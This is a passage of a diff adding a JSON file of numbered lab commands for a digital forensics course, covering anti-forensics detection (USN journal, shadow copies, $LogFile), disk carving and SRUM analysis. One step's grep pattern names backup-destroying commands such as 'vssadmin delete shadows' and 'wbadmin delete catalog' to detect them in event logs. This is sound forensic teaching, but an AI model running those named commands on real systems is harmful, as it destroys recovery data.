+   "cmd": "python3 -c \"import json,sys; d=json.load(open('detect.json')); print(sum(len(r.get('matches',[])) for r in d), 'detections across', len(d), 'rules'); [print(' -', r.get('title')) for r in d]\"",
+   "doc": "3 detections across 1 rules\n - New Service Installed\n"
+  }
+ ],
+ "module-23-anti-forensics-wiping": [
+  {
+   "n": 1,
+   "cmd": "cd module-23-anti-forensics-wiping/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "MFTECmd -f UsnJrnl_J --csv . --csvf usn.csv",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "grep -c RenameOldName usn.csv",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "cut -d, -f1,10 usn.csv | grep -i rename | head -20",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "cut -d, -f1,10 usn.csv | grep RenameOldName | head -1",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "grep -iE 'EFSTMPWP|fil.*\\.tmp|[0-9]\\.E' usn.csv | cut -d, -f1,10 | head -20",
+   "doc": null
+  },
+  {
+   "n": 7,
+   "cmd": "MFTECmd -f MFT --csv . --csvf mft.csv",
+   "doc": null
+  },
+  {
+   "n": 8,
+   "cmd": "grep -iE 'EFSTMPWP|fil.*\\.tmp|[0-9]\\.E' mft.csv | cut -d, -f3,6,7 | head -20",
+   "doc": null
+  }
+ ],
+ "module-24-anti-forensics-vss": [
+  {
+   "n": 1,
+   "cmd": "cd module-24-anti-forensics-vss/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "EvtxECmd -f security_t1490.evtx --csv . --csvf t1490.csv",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "grep -c ',4688,' t1490.csv",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "grep -aoiE 'vssadmin (delete shadows|resize shadowstorage)|wmic shadowcopy delete|wbadmin delete (catalog|systemstatebackup)' t1490.csv | sed 's/  */ /g' | sort -u",
+   "doc": "# 1) find the partition offset with mmls (Module 15), then list the shadow stores:\nvshadowinfo -o <partition_byte_offset> disk.raw\n#    -> prints each store's number, creation time, and volume size\n\n# 2) expose every snapshot as a raw device (vss1, vss2, \u2026):\nvshadowmount -o <partition_byte_offset> disk.raw /mnt/vss\n\n# 3) now treat each vssN as a volume \u2014 run the SAME Sleuth Kit / MFTECmd workflow\n#    from Module 15 against the historical state:\nfls -r /mnt/vss/vss1        # each vssN is already a bare volume (no mmls/-o needed)\nicat /mnt/vss/vss1 <inode>  # recover a file the attacker later deleted/wiped\n#    (for an E01 image, ewfmount it first, then point vshadowinfo at ewf1)\n"
+  }
+ ],
+ "module-25-anti-forensics-logfile": [
+  {
+   "n": 1,
+   "cmd": "cd module-25-anti-forensics-logfile/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "cat LogFile_FileNames.csv",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "cut -d'|' -f2,10,13 LogFile_transactions.csv | grep -iE 'report|notes|temp' | head -25",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "grep -i CreateAttribute LogFile_transactions.csv | cut -d'|' -f2,10,13 | head",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "grep -iE 'DeallocateFileRecordSegment|DeleteIndexEntryRoot' LogFile_transactions.csv | cut -d'|' -f2,10,13 | head",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "cut -d'|' -f10 LogFile_transactions.csv | tail -n +2 | sort | uniq -c | sort -rn | head",
+   "doc": null
+  }
+ ],
+ "module-26-anti-forensics-carving": [
+  {
+   "n": 1,
+   "cmd": "cd module-26-anti-forensics-carving/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "gzip -dkf disk-carve-lab.raw.gz",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "mmls disk-carve-lab.raw",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "fls -o 128 -rd disk-carve-lab.raw",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "icat -o 128 disk-carve-lab.raw 39",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "blkls -o 128 disk-carve-lab.raw > unalloc.raw",
+   "doc": null
+  },
+  {
+   "n": 7,
+   "cmd": "grep -aoE 'MARKER-[A-Z]+-[0-9]+' unalloc.raw | sort -u",
+   "doc": null
+  },
+  {
+   "n": 8,
+   "cmd": "grep -aoE '([0-9]{6}-){7}[0-9]{6}' unalloc.raw | sort -u",
+   "doc": null
+  }
+ ],
+ "module-27-srum": [
+  {
+   "n": 1,
+   "cmd": "cd module-27-srum/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "gzip -dkf SRUDB.dat.gz",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "ls -la SRUDB.dat",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "SrumECmd.exe -f SRUDB.dat --csv .",
+   "doc": "Error processing Push Notification info (...): No such table or object\n"
+  },
+  {
+   "n": 5,
+   "cmd": "ls -1 *_Output.csv",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "wc -l *_Output.csv",
+   "doc": null
+  },
+  {
+   "n": 7,
+   "cmd": "head -1 *NetworkUsages_Output.csv | tr ',' '\\n' | cat -n",
+   "doc": null
+  },
+  {
+   "n": 8,
+   "cmd": "head -1 *AppResourceUseInfo_Output.csv | tr ',' '\\n' | cat -n",
+   "doc": "SrumECmd.exe -f SRUDB.dat -r SOFTWARE --csv .\n"
+  }
+ ]
+}
